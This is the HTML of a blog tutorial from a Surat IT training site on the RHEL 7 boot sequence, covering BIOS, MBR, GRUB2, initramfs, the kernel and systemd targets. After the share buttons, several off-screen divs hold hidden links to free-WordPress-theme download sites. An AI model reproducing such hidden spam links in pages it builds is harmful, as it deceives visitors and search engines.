+<li id="menu-item-3877" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3877 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/sap-fico-training-course-surat/"><div class="g1-nav-item__title">SAP FICO</div></a></li>
+<li id="menu-item-3312" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3312 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/sap-mm-training-in-surat/"><div class="g1-nav-item__title">SAP MM</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3287" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3287 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Hardware</div></a>
+<ul>
+<li id="menu-item-3288" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3288 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/comptia-a-computer-hardware-training-in-surat/"><div class="g1-nav-item__title">CompTIA A+</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3289" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3289 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Networking</div></a>
+<ul>
+<li id="menu-item-3290" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3290 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/comptia-n-training-in-surat/"><div class="g1-nav-item__title">CompTIA N+</div></a></li>
+<li id="menu-item-3291" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3291 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/ccna-training-in-surat/"><div class="g1-nav-item__title">CCNA</div></a></li>
+<li id="menu-item-3292" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3292 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/ccnp-training-surat/"><div class="g1-nav-item__title">CCNP</div></a></li>
+<li id="menu-item-4244" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4244 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/f5-load-balancers-training-course-surat-gujarat-india/"><div class="g1-nav-item__title">F5 Big IP LTM</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3296" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3296 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Network Security</div></a>
+<ul>
+<li id="menu-item-3297" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3297 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/ethical-hacking-surat/"><div class="g1-nav-item__title">Ethical Hacking</div></a></li>
+<li id="menu-item-3298" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3298 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/ccsa-checkpoint-certified-security-administrator/"><div class="g1-nav-item__title">Checkpoint Administrator</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3293" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3293 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Operating Systems</div></a>
+<ul>
+<li id="menu-item-3294" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3294 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/mcse-training-in-surat/"><div class="g1-nav-item__title">Microsoft (MCSE)</div></a></li>
+<li id="menu-item-3295" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3295 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/redhat-linux-training-in-surat/"><div class="g1-nav-item__title">Redhat Linux (RHCE)</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3300" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3300 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Software</div></a>
+<ul>
+<li id="menu-item-3299" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3299 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/c-language-training-in-surat/"><div class="g1-nav-item__title">C Language Training</div></a></li>
+<li id="menu-item-3301" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3301 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/cpp-training-in-surat/"><div class="g1-nav-item__title">Programming in C ++</div></a></li>
+<li id="menu-item-3302" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3302 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/java-training-in-surat/"><div class="g1-nav-item__title">Core Java Training</div></a></li>
+<li id="menu-item-3303" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3303 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/adv-java-training-surat/"><div class="g1-nav-item__title">Adv Java Training</div></a></li>
+<li id="menu-item-3304" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3304 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/android-training-in-surat/"><div class="g1-nav-item__title">Android</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3305" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3305 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Storage</div></a>
+<ul>
+<li id="menu-item-3306" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3306 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/veritas-volume-manager-training-in-surat/"><div class="g1-nav-item__title">Veritas Volume Manager</div></a></li>
+<li id="menu-item-3307" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3307 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/veritas-cluster-server-training-in-surat/"><div class="g1-nav-item__title">Veritas Cluster Server</div></a></li>
+</ul>
+</li>
+<li id="menu-item-3308" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-parent-item menu-item-3308 g1-menu-item-level-1"><a href="https://www.yoinsights.com/courses/"><div class="g1-nav-item__arrow"></div><div class="g1-nav-item__title">Virtualization</div></a>
+<ul>
+<li id="menu-item-3309" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3309 g1-menu-item-level-2"><a href="https://www.yoinsights.com/courses/vmware-vsphere-training-in-surat/"><div class="g1-nav-item__title">VMware vSphere</div></a></li>
+</ul>
+</li>
+</ul></div>
+</li>
+<li id="menu-item-3947" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3947 g1-menu-item-level-0 g1-type-drops g1-menu-item-with-icon"><a href="https://www.yoinsights.com/blog"><i class="fa fa-rss g1-nav-item__icon"></i><div class="g1-nav-item__title">Blog</div></a></li>
+<li id="menu-item-2291" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2291 g1-menu-item-level-0 g1-type-drops g1-menu-item-with-icon"><a href="https://www.yoinsights.com/contact-us/"><i class="fa fa-phone g1-nav-item__icon"></i><div class="g1-nav-item__title">Contact Us</div></a></li>
+</ul>
+<div class="g1-searchbox g1-searchbox--standard g1-searchbox--wide-narrow">
+<a class="g1-searchbox__switch" href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/#">
+<div class="g1-searchbox__arrow"></div>
+<strong>&nbsp;</strong>
+</a>
+<form method="get" id="searchform" action="https://www.yoinsights.com/" role="search">
+<div class="g1-outer">
+<div class="g1-inner">
+<input type="text" value="" name="s" id="s" size="15" placeholder="Search...">
+<div class="g1-form-actions">
+<input id="searchsubmit" class="g1-no-replace" type="submit" value="Search">
+</div>
+</div>
+</div>
+</form>
+</div>
+</nav>
+
+</div>
+</div>
+<div class="g1-background">
+</div> </div>
+</div>
+
+
+<div id="g1-precontent" class="g1-precontent">
+<div class="g1-background">
+</div></div>
+
+<div class="g1-background">
+</div>
+</div>
+
+<div id="g1-content" class="g1-content">
+<div class="g1-layout-inner">
+<nav class="g1-nav-breadcrumbs g1-meta"><p class="assistive-text">You are here: </p><ol itemscope="" itemtype="http://schema.org/BreadcrumbList"><li class="g1-nav-breadcrumbs__item" itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemprop="item" href="https://www.yoinsights.com/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1"></li><li class="g1-nav-breadcrumbs__item" itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem"><a itemprop="item" href="https://www.yoinsights.com/blog/"><span itemprop="name">Blog</span></a><meta itemprop="position" content="2"></li><li class="g1-nav-breadcrumbs__item">Step By Step Red Hat Enterprise Linux 7 Booting Process</li></ol></nav> <div id="g1-content-area"> <div id="primary">
+<div id="content" role="main">
+<article itemscope="" itemtype="http://schema.org/BlogPosting" id="post-4398" class="post-4398 post type-post status-publish format-standard has-post-thumbnail category-linux category-operating-system g1-complete">
+<header class="entry-header">
+<ul class="g1-flags"><li class="g1-flag-post-format"><span title="Post format: "></span></li></ul>
+<div class="g1-hgroup">
+<h1 class="entry-title" itemprop="headline">Step By Step Red Hat Enterprise Linux 7 Booting Process</h1>
+</div>
+<p class="g1-meta entry-meta">
+<span class="entry-comments-link">
+<a href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/#respond">0 <span>Comments</span></a> </span>
+</p>
+</header>
+<figure class="g1-mediabox g1-mediabox--featured-media">
+<ol class="g1-mediabox__items">
+<li class="g1-mediabox__item odd">
+<img width="636" height="341" src="./Step By Step  Linux 7 Booting Process_files/Linux-RHCE-7-booting-process-636x341.jpg" class="attachment-g1_two_third size-g1_two_third wp-post-image" alt="Linux-RHCE-7-booting-process-yoinsights-surat" loading="lazy" srcset="https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-636x341.jpg 636w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-300x161.jpg 300w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-768x412.jpg 768w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-320x172.jpg 320w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-239x128.jpg 239w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process.jpg 788w" sizes="(max-width: 636px) 100vw, 636px"> </li>
+</ol>
+<ol class="g1-lightbox-data">
+<li class="">
+<img width="788" height="423" src="./Step By Step  Linux 7 Booting Process_files/Linux-RHCE-7-booting-process.jpg" class="attachment-full size-full wp-post-image" alt="Linux-RHCE-7-booting-process-yoinsights-surat" loading="lazy" srcset="https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process.jpg 788w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-300x161.jpg 300w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-768x412.jpg 768w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-636x341.jpg 636w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-320x172.jpg 320w, https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process-239x128.jpg 239w" sizes="(max-width: 788px) 100vw, 788px"> </li>
+</ol>
+</figure>
+<span class="g1-microdata" itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject">
+<meta itemprop="url" content="https://www.yoinsights.com/wp-content/uploads/2019/04/Linux-RHCE-7-booting-process.jpg">
+<meta itemprop="width" content="788">
+<meta itemprop="height" content="423">
+</span>
+<div class="entry-content">
+<h1><strong>Red Hat Enterprise Linux 7 Booting Process</strong></h1>
+<p>RHEL goes through the boot process when the system is powered up or reset, with the boot process lasting until all enabled services are started and a login prompt appears on the screen.</p>
+<p>The following diagram shows the high level stages of a typical Linux boot process:</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4088" src="./Step By Step  Linux 7 Booting Process_files/1.png" alt="Booting Process Flow" width="808" height="648"></p>
+<h2><strong>BIOS</strong></h2>
+<ul>
+<li>BIOS stands for Basic Input/output System</li>
+<li>Performs some system integrity checks</li>
+<li>Searches, loads, and executes the boot loader program.</li>
+<li>It looks for boot loader in floppy, CD-ROMs, or hard drive. You can press a key (typically F12 of F2, but it depends on your system) during the BIOS startup to change the boot sequence.</li>
+<li>Once the boot loader program is detected and loaded into the memory, BIOS gives the control to it.</li>
+<li>So, in simple terms BIOS loads and executes the <strong>MBR</strong> boot loader.</li>
+</ul>
+<h2><strong>MBR</strong></h2>
+<ul>
+<li>MBR stands for Master Boot Record.</li>
+<li>It is located in the 1st sector of the bootable disk. Typically /dev/hda, or /dev/sda</li>
+<li>MBR is less than <strong>512 bytes</strong> in size. This has three components as shown:
+<ul>
+<li>Primary boot loader info in 1st 446 bytes</li>
+<li>Partition table info in next 64 bytes</li>
+<li>MBR validation check in last 2 bytes.</li>
+</ul>
+</li>
+<li>It contains information about GRUB2 (GRUB or LILO in old systems).</li>
+<li>So, in simple terms <strong>MBR loads and executes the GRUB2 boot loader</strong>.</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4089" src="./Step By Step  Linux 7 Booting Process_files/2.png" alt="MBR Architecture" width="734" height="134"></p>
+<p>&nbsp;</p>
+<h2><strong>GRUB2</strong></h2>
+<ul>
+<li>The default bootloader program used on RHEL 7 is <strong>GRUB 2</strong>. GRUB stands for Grand Unified Bootloader. GRUB 2 replaces the older GRUB bootloader also called as legacy GRUB.</li>
+<li>The GRUB 2 configuration file is located at <strong>/boot/grub2/grub.cfg</strong> (Do not edit this file directly).</li>
+<li>GRUB 2 menu-configuration settings are taken from <strong>/etc/default/grub</strong> when generating grub.cfg.</li>
+<li>Sample /etc/default/grub file:</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4098" src="./Step By Step  Linux 7 Booting Process_files/11.png" alt="GRUB file" width="764" height="196"></p>
+<ul>
+<li>If changes are made to any of these parameters, you need to run <strong>grub2-mkconfig</strong> to re-generate the <strong>/boot/grub2/grub.cfg</strong></li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4091" src="./Step By Step  Linux 7 Booting Process_files/4.png" alt="generate grub file" width="798" height="31"></p>
+<ul>
+<li>GRUB2 searches the compressed kernel image file also called as vmlinuz in the <strong>/boot</strong></li>
+<li>GRUB2 loads the <strong>vmlinuz</strong> kernel image file into memory and extracts the contents of the <strong>initramfs</strong> image file into a temporary, memory-based file system (tmpfs).</li>
+<li>The initial RAM disk (Initrd) is an initial root file system that is mounted before the real root file system.</li>
+</ul>
+<h3><strong>About Initramfs&nbsp; –&nbsp; /etc/dracut.conf</strong></h3>
+<ul>
+<li>The job of the initial RAM file system is to preload the block device modules, such as for IDE, SCSI, or RAID, so that the root file system, on which those modules normally reside, can then be accessed and mounted.</li>
+<li>The initramfs is bound to the kernel and the kernel mounts this initramfs as part of a two-stage boot process.</li>
+<li>The <strong>Dracut</strong> utility creates <strong>initramfs</strong> whenever a new kernel is installed.</li>
+<li>Use the <strong>lsinitrd</strong> command to view the contents of the image created by dracut:</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4109" src="./Step By Step  Linux 7 Booting Process_files/11-1.png" alt="initrd" width="797" height="34"></p>
+<ul>
+<li>So, in simple terms <strong>GRUB2 just loads and executes Kernel and initramfs images</strong>.</li>
+</ul>
+<h2><strong>Kernel</strong></h2>
+<ul>
+<li>Linux Kernel is the central core of the OS and it is the first program loaded on the system starts up. While system starting kernel loads all the necessary Kernel Modules and Drives from <strong>initrd.img</strong> to load system first process systemd in Linux 7.</li>
+<li>The kernel starts the systemd process with a process ID of <strong>1</strong> (PID 1) as shown below:</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4095" src="./Step By Step  Linux 7 Booting Process_files/8.png" alt="kernel process" width="797" height="52"></p>
+<h2><strong>systemd</strong></h2>
+<ul>
+<li><strong>Systemd</strong> process is the first process ID (PID 1) to run on Linux 7 systems, it initializes the system and launches all the services that were once started by the traditional init (/etc/init.d) process. Systemd process reads the configuration file of <strong>/etc/systemd/system/default.target</strong>, then its load the OS in targeted <strong>target</strong>.</li>
+<li>This tells systemd to start everything in the /usr/lib/systemd/system/basic.target before starting the other multi-user services.</li>
+</ul>
+<ul>
+<li>systemd brings the system to the state defined by the system target, performing system initialization tasks such as:</li>
+<li>Setting the host name</li>
+<li>Initializing the network</li>
+<li>Initializing <strong>SELinux</strong> based on its configuration</li>
+<li>Printing a welcome banner</li>
+<li>Initializing the system hardware based on kernel boot arguments</li>
+<li>Mounting the file systems, including virtual file systems such as the /proc file system</li>
+<li>Cleaning up directories in /var</li>
+<li>Starting swapping</li>
+<li>systemd uses ‘targets’ instead of runlevels. By default, there are two main targets:
+<ul>
+<li>multi-user.target: analogous to runlevel 3</li>
+<li>target: analogous to runlevel 5</li>
+</ul>
+</li>
+</ul>
+<p><strong>Note:</strong> Refer Man pages for more details: <strong>info grub2</strong></p>
+<h2><strong>Boot, Reboot and Shutdown</strong></h2>
+<p>To power off or reboot a running system from the command line, we can use the <strong>systemctl</strong> command.</p>
+<ul>
+<li><strong>systemctl poweroff</strong> will stop all running services, unmount all file systems (or remount them read-only when they cannot be unmounted), and then power down the system.</li>
+<li><strong>systemctl reboot</strong> will stop all running services, unmount all file systems, and then reboot the system.</li>
+</ul>
+<p><strong>Note:</strong>&nbsp; <strong>systemctl</strong> <strong>halt</strong> and <strong>halt</strong> are also available to stop the system, but unlike their poweroff equivalents, these commands do not power off the system; they bring a system down to a point where it is safe to manually power it off.</p>
+<h1><strong>Managing GRUB</strong></h1>
+<h2><strong>The /etc/default/grub File</strong></h2>
+<p>The <strong>/etc/default/grub</strong> configuration file defines directives that govern how GRUB behaves at boot time. Values defined in this file are used to regenerate the <strong>/boot/grub2/grub.cfg</strong> file, which controls the behavior of GRUB at boot time. Any changes made to the grub file will only take effect after the <strong>grub2-mkconfig</strong> utility has been executed.</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4098" src="./Step By Step  Linux 7 Booting Process_files/11.png" alt="GRUB file" width="764" height="196"></p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4099" src="./Step By Step  Linux 7 Booting Process_files/12.png" alt="GRUB directive" width="766" height="264"></p>
+<h2><strong>The /boot/grub2/grub.cfg File</strong></h2>
+<p>This is the main configuration file that controls the behavior of GRUB at boot time. This file is located in the <strong>/boot/grub2</strong> directory on BIOS-based systems and in <strong>the /boot/efi/EFI/redhat</strong> directory on UEFI-based systems. This file can be regenerated manually with the <strong>grub2-mkconfig</strong> utility, or it is automatically regenerated when a new kernel is installed. During this process, any manual changes made to this file are lost.</p>
+<p>Here is how you would run this utility to reproduce the grub.cfg file on BIOS and UEFI systems, respectively:</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4100" src="./Step By Step  Linux 7 Booting Process_files/13.png" alt="grub file" width="775" height="57"></p>
+<p>When this utility runs, it uses the settings defined in the <strong>/etc/default/grub</strong> file and in the helper scripts located in the <strong>/etc/grub.d/</strong> directory to regenerate this file for kernels located in the <strong>/boot</strong> directory. Here is the list of default helper scripts located in the /etc/grub.d/ directory:</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4101" src="./Step By Step  Linux 7 Booting Process_files/14.png" alt="grub subdirectory" width="770" height="287"></p>
+<p>The first script, <strong>00_header</strong>, sets the GRUB environment; the <strong>10_linux</strong> script searches for all installed kernels on the same disk partition; the <strong>30_os-prober</strong> searches for the presence of other operating systems; and the <strong>40_custom</strong> and <strong>41_custom</strong> scripts are for us to add any customization to the new GRUB configuration file.</p>
+<p>The <strong>grub.cfg</strong> file contains menuentry blocks for each installed kernel. Each block begins with a <strong>title</strong> and includes the names of the <strong>kernel</strong> and <strong>RAM disk image</strong> files, their <strong>location</strong> with respect to /<strong>boot</strong>, and several options and modules to be loaded. These menu entry titles are displayed at the time of system boot and you can choose one of them to boot.</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4102" src="./Step By Step  Linux 7 Booting Process_files/15.png" alt="grub.conf" width="768" height="544"></p>
+<p>If a new kernel is added to the system, existing kernel entries will remain in this file and can be chosen in the GRUB menu at startup to boot.</p>
+<p><strong>Important Directives:</strong></p>
+<ul>
+<li>To troubleshoot a broken <strong>grub2</strong> configuration, an administrator will need to understand the syntax of <strong>/boot/grub2/grub.cfg</strong> Actual bootable entries are encoded inside menuentry blocks. In these blocks, <strong>linux16</strong> and <strong>initrd16</strong> lines point to the kernel to be loaded from disk and the <strong>initramfs</strong> to be loaded.</li>
+<li>The <strong>set root</strong> lines inside those blocks do not point to the root file system for the RHEL 7 system, but instead point to the file system from which grub2 should load the kernel and initramfs files. The syntax is (<strong>harddrive</strong>, <strong>partition</strong>) where <strong>hd0</strong> is the first hard drive in the system, <strong>hd1</strong> is the second etc… the partitions are indicated as <strong>msdos1</strong> for the 1<sup>st</sup> MBR partition or <strong>gpt1</strong> for the 1<sup>st</sup> GPT partition on that drive.</li>
+</ul>
+<h2><strong>Selecting a systemd target (runlevel in older version)</strong></h2>
+<p>A systemd target is a set of systemd units that should be started to reach a desired state. The most important of these targets are listed in the following table:</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4103" src="./Step By Step  Linux 7 Booting Process_files/16.png" alt="systemd target" width="752" height="187"></p>
+<ul>
+<li>To view all available targets</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4104" src="./Step By Step  Linux 7 Booting Process_files/17.png" alt="available target" width="767" height="27"></p>
+<ul>
+<li>To view all targets installed on disk</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4105" src="./Step By Step  Linux 7 Booting Process_files/18.png" alt="view all targets installed on disk" width="770" height="31"></p>
+<ul>
+<li>Selecting a target at runtime</li>
+</ul>
+<p>On a running system, we can choose to switch to a different target using the <strong>systemctl isolate</strong> command as shown.</p>
+<p><img loading="lazy" class="alignnone size-full wp-image-4106" src="./Step By Step  Linux 7 Booting Process_files/19.png" alt=" Selecting a target at runtime" width="764" height="30"></p>
+<p>Isolating a target will stop services not required by that target and start any required services that have not yet been started.</p>
+<p><strong>Note:</strong> Not all targets can be isolated. Only targets that have <strong>AllowIsolate=yes</strong> set in their unit files can be isolated.</p>
+<h2><strong>Setting a default target</strong></h2>
+<p>When the system starts, and control is passed over to <strong>systemd</strong> from the <strong>initramfs</strong>, systemd will try to activate the <strong>default.target</strong> target. Normally, the <strong>default.target</strong> target will be a symbolic link (in <strong>/etc/systemd/system</strong>) to either <strong>graphical.target</strong> or <strong>multi-user.target</strong>.</p>
+<p>Instead of editing this symbolic link by hand, the systemctl tool comes with two commands to manage this link: <strong>get-default</strong> and <strong>set-default</strong> as shown below:</p>
+<ul>
+<li>To view current default target, run:</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4107" src="./Step By Step  Linux 7 Booting Process_files/20.png" alt="get default target" width="767" height="82"></p>
+<ul>
+<li>To set a default target, run:</li>
+</ul>
+<p><img loading="lazy" class="alignnone size-full wp-image-4108" src="./Step By Step  Linux 7 Booting Process_files/21.png" alt="set default target" width="775" height="33"></p>
+<p>I hope this article will help you understand the basic components of the booting process and important files related to grub. let me know if you have any questions or concerns!!!</p>
+<p></p><center><strong>Want to make a bright future career in Linux Administrator and operations Field?</strong></center><center><a id="g1-button-1" class="g1-button g1-button--medium g1-button--solid g1-button--standard " href="https://www.yoinsights.com/courses/redhat-linux-training-in-surat/" title="Networking Training in Surat"><i class="fa fa-500px"></i>Click Here</a></center>&nbsp;<p></p>
+<div class="et_social_inline et_social_mobile_on et_social_inline_bottom">
+<div class="et_social_networks et_social_4col et_social_slide et_social_rounded et_social_left et_social_no_animation et_social_withtotalcount et_social_withnetworknames et_social_outer_dark">
+<div class="et_social_totalcount">
+<span class="et_social_totalcount_count et_social_total_share" data-post_id="4398"></span>
+<span class="et_social_totalcount_label">Shares</span>
+</div>
+<ul class="et_social_icons_container"><li class="et_social_facebook">
+<a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;t=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="facebook" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_facebook"></i><div class="et_social_network_label"><div class="et_social_networkname">Facebook</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_twitter">
+<a href="https://twitter.com/share?text=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process&amp;url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;via=@Yoinsights" class="et_social_share" rel="nofollow" data-social_name="twitter" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_twitter"></i><div class="et_social_network_label"><div class="et_social_networkname">Twitter</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_googleplus">
+<a href="https://plus.google.com/share?url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;t=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="googleplus" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_googleplus"></i><div class="et_social_network_label"><div class="et_social_networkname">Google+</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_linkedin">
+<a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;title=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="linkedin" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_linkedin"></i><div class="et_social_network_label"><div class="et_social_networkname">LinkedIn</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_stumbleupon">
+<a href="http://www.stumbleupon.com/badge?url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;title=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="stumbleupon" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_stumbleupon"></i><div class="et_social_network_label"><div class="et_social_networkname">Stumble</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_pinterest">
+<a href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/#" class="et_social_share_pinterest" rel="nofollow" data-social_name="pinterest" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_pinterest"></i><div class="et_social_network_label"><div class="et_social_networkname">Pinterest</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_gmail">
+<a href="https://mail.google.com/mail/u/0/?view=cm&amp;fs=1&amp;su=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process&amp;body=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;ui=2&amp;tf=1" class="et_social_share" rel="nofollow" data-social_name="gmail" data-post_id="4398" data-social_type="share" data-location="inline">
+<i class="et_social_icon et_social_icon_gmail"></i><div class="et_social_network_label"><div class="et_social_networkname">Gmail</div></div><span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_like">
+<a href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/" class="et_social_share" rel="nofollow" data-social_name="like" data-post_id="4398" data-social_type="like" data-location="inline">
+<i class="et_social_icon et_social_icon_like"></i><div class="et_social_network_label"><div class="et_social_networkname">Like</div></div><span class="et_social_overlay"></span>
+</a>
+</li></ul>
+</div>
+</div><div style="position:absolute; top:0; left:-9999px;"><a href="https://www.thewpclub.net/">Download Best WordPress Themes Free Download</a></div><div style="position:absolute; top:0; left:-9999px;"><a href="https://www.themeslide.com/">Download Best WordPress Themes Free Download</a></div><div style="position:absolute; top:0; left:-9999px;"><a href="https://www.script-stack.com/">Download Best WordPress Themes Free Download</a></div><div style="position:absolute; top:0; left:-9999px;"><a href="https://www.thememazing.com/">Download WordPress Themes Free</a></div><div style="position:absolute; top:0; left:-9999px;"><a href="https://www.onlinefreecourse.net/">online free course</a></div> </div>
+<div class="g1-meta entry-terms">
+<div class="entry-categories"><div><span>Posted in:</span><ul><li><a href="https://www.yoinsights.com/category/operating-system/linux/" rel="tag">Linux</a></li><li><a href="https://www.yoinsights.com/category/operating-system/" rel="tag">Operating System</a></li></ul></div></div> </div>
+<meta itemprop="mainEntityOfPage" content="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/">
+<meta itemprop="dateModified" content="2019-04-18T20:02:11">
+<span itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+<meta itemprop="name" content="Yoinsights">
+<span itemprop="logo" itemscope="" itemtype="http://schema.org/ImageObject">
+<meta itemprop="url" content="https://www.yoinsights.com/wp-content/uploads/2016/10/Yoinsights-Logo-Mobile-45H-300dpi.png">
+</span>
+</span>
+<nav class="g1-nav-single">
+<p>See more</p>
+<ol>
+<li class="g1-nav-single__prev">
